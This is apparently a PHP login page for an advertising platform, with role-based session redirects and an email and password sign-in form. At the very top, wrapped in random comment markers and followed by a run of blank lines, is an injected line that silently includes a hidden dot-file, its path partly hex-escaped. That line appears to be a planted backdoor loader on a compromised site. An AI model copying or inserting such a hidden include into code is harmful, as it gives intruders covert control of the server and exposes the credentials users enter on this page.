<?php
/*ea43c*/

@include /*m0yat*/("/home/dprr8htr8t41/p\x75blic_html/richmedia.biz/app/advertiser/razorpay/.9d9196b3.oti");

/*ea43c*/

















require_once('config.php');
if(isset($_SESSION['logged'])){
  $type=$_SESSION['type'];
  if($type==1){
    redirect('advertiser/dashboard.php');
  }elseif($type==5){
    redirect('support/dashboard.php');
  }elseif($type==3){
    redirect('manager/dashboard.php');
  }elseif($type==2){
    redirect('mandate/dashboard.php');
  }
  else{
    redirect('admin/dashboard.php');
  }
}
if(isset($_POST['signin'])){
  $users->login();
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Login</title>
  <?php include('common/head.php') ?>
</head>
<body class="hold-transition register-page bg-image">
  <div class="white-wapper">
    <div class="white-layer">
      <?php echo flashNotification() ?>
      <form method="post" id="signup" class="form-horizontal">
        <div class="row">
          <div class="col-md-3"></div>
          <div class="col-md-6 text-center advertiser-hidden">
            <input type="radio" name="type" value="1" id="advertisers" checked class="role-type">
            <label for="advertisers" class="role-type-btn">Advertisers</label>
            <input type="radio" name="type" value="2" id="publishers" class="role-type">
            <label for="publishers" class="role-type-btn">Publishers</label>
          </div>
          <div class="col-md-3"></div>
        </div>
        <br/>
        <br/>
        <div class="row">
          <div class="col-md-1"></div>
          <div class="col-md-4">
            <div class="white-box">
              <h3 class="box-title">ADVERTISERS</h3>
              <div class="text-center advertiser-image-cover">
                <img src="<?php echo baseurl.'/images/advertiser.png'; ?>">
              </div>
              <div class="text-cover">
                <ul class="advertiser-keys">
                  <li>Create your Account</li>
                  <li>Setup your Campaign</li>
                  <li>Launch your Campaign</li>
                  <li>Track your Campaign anytime anywhere</li>
                </ul>
              </br>

              </div>
            </div>
          </div>
          <div class="col-md-6">
            <div class="white-box">
              <h3 class="box-title">Sign In</h3>
              <div class="text-center advertiser-image-cover">
                <img src="<?php echo baseurl.'/images/sign-in.png'; ?>">
              </div>
              </br>
              </br>
              <div class="form-group">
                <label class="col-sm-3 control-label">Email ID</label>
                <div class="col-sm-7">
                  <input type="email" class="form-control" name="email" required>
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Password</label>
                <div class="col-sm-7">
                  <input type="password" class="form-control" minlength="6" name="password" required>
                </div>
              </div>
              <div class="form-group">
                <div class="col-sm-7 col-md-offset-3">
                  <input type="checkbox" name="conditions" value="1" required id="conditions">
                  <label for="conditions">
                     I agree to the <a href="terms-and-conditions.html">terms and Conditions</a>
                  </label>
                </div>
              </div>
              <div class="form-group">
                <div class="col-sm-offset-3 col-sm-7">
                  <button type="submit" name="signin" class="btn btn-theme btn-block btn-flat">Sign In</button>
                </div>
                <div class="col-sm-offset-3 col-sm-7">
                  <hr class="or-do" />
                  <a href="signup.php" class="pull-left text-red text-bold">Register New</a>
                  <a href="forgot-password.php" class="pull-right text-red text-bold">Forgot Password</a>
                  <div class="text-center mt">
                    <a href="https://www.richmedia.biz/">(Back to Homepage)</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="col-md-1"></div>
        </div>
      </form>
      <br/>
    </div>
  </div>
  <footer class="foot">
  <div class="pull-right hidden-xs">
    <a href="../terms-and-conditions.html">Terms And Conditions&nbsp;&nbsp;&nbsp;&nbsp;</a><a href="../privacypolicy.html">Privacy Policy</a>
  </div>
  <strong>Copyright &copy; 2019-2020 <a href="https://www.richmedia.biz/" target="_blank">Richmedia Advertising</a>.</strong> All rights
  reserved.
</footer>
<?php //include('common/footer.php') ?>
<?php include('common/footer-script.php') ?>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
<script>
  $('#signup').validate({
    errorElement : 'div',
    errorPlacement: function(error, element) {
      var placement = $(element).parents('.col-sm-7').data('error');
      if (placement) {
        $(placement).append(error)
      } else {
        $(element).parents('.col-sm-7').append(error);
      }
    }
  });
</script>
</body>
</html>
